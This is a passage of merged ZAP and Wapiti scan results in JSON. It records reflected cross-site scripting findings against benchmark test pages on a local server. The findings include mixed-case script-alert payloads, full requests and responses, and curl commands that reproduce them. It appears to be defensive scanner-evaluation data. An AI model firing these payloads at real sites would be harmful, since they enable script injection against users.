            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:14 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:22:13 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w0yjw6v4jw')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-05/BenchmarkTest02580?BenchmarkTest02580=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-05/BenchmarkTest02580?username=alice&password=Letm3in_&BenchmarkTest02580=%3CScRiPt%3Ealert%28%27w857xie2o0%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w857xie2o0')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w857xie2o0')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02580?username=alice&password=Letm3in_&BenchmarkTest02580=%3CScRiPt%3Ealert%28%27w857xie2o0%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02580.html?BenchmarkTest02580=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02580"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02580?BenchmarkTest02580=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02580.html?BenchmarkTest02580=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02580?username=alice&password=Letm3in_&BenchmarkTest02580=%3CScRiPt%3Ealert%28%27w857xie2o0%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '36', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:14 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '46', 'date': 'Sun, 31 Aug 2025 04:22:14 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w857xie2o0')</sCrIpT>_SafeStuff\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-05/BenchmarkTest02582?BenchmarkTest02582=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-05/BenchmarkTest02582?username=alice&password=Letm3in_&BenchmarkTest02582=%3CScRiPt%3Ealert%28%27w9psdjz7up%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w9psdjz7up')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w9psdjz7up')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02582?username=alice&password=Letm3in_&BenchmarkTest02582=%3CScRiPt%3Ealert%28%27w9psdjz7up%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02582.html?BenchmarkTest02582=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02582"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02582?BenchmarkTest02582=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02582.html?BenchmarkTest02582=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02582?username=alice&password=Letm3in_&BenchmarkTest02582=%3CScRiPt%3Ealert%28%27w9psdjz7up%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '36', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:14 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '46', 'date': 'Sun, 31 Aug 2025 04:22:15 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w9psdjz7up')</sCrIpT>_SafeStuff\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-05/BenchmarkTest02583?BenchmarkTest02583=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-05/BenchmarkTest02583?username=alice&password=Letm3in_&BenchmarkTest02583=%3CScRiPt%3Ealert%28%27wpa0p9idgy%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wpa0p9idgy')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wpa0p9idgy')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02583?username=alice&password=Letm3in_&BenchmarkTest02583=%3CScRiPt%3Ealert%28%27wpa0p9idgy%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02583.html?BenchmarkTest02583=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02583"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02583?BenchmarkTest02583=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02583.html?BenchmarkTest02583=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02583?username=alice&password=Letm3in_&BenchmarkTest02583=%3CScRiPt%3Ealert%28%27wpa0p9idgy%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:14 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:22:15 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wpa0p9idgy')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-05/BenchmarkTest02584?BenchmarkTest02584=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-05/BenchmarkTest02584?username=alice&password=Letm3in_&BenchmarkTest02584=%3CScRiPt%3Ealert%28%27wjsjz5mp9e%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wjsjz5mp9e')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wjsjz5mp9e')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02584?username=alice&password=Letm3in_&BenchmarkTest02584=%3CScRiPt%3Ealert%28%27wjsjz5mp9e%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02584.html?BenchmarkTest02584=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02584"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02584?BenchmarkTest02584=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02584.html?BenchmarkTest02584=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02584?username=alice&password=Letm3in_&BenchmarkTest02584=%3CScRiPt%3Ealert%28%27wjsjz5mp9e%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '36', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:14 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '46', 'date': 'Sun, 31 Aug 2025 04:22:15 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wjsjz5mp9e')</sCrIpT>_SafeStuff\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-05/BenchmarkTest02586?BenchmarkTest02586=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-05/BenchmarkTest02586?username=alice&password=Letm3in_&BenchmarkTest02586=%3CScRiPt%3Ealert%28%27w8wxwjm7ku%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w8wxwjm7ku')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w8wxwjm7ku')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02586?username=alice&password=Letm3in_&BenchmarkTest02586=%3CScRiPt%3Ealert%28%27w8wxwjm7ku%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02586.html?BenchmarkTest02586=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02586"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
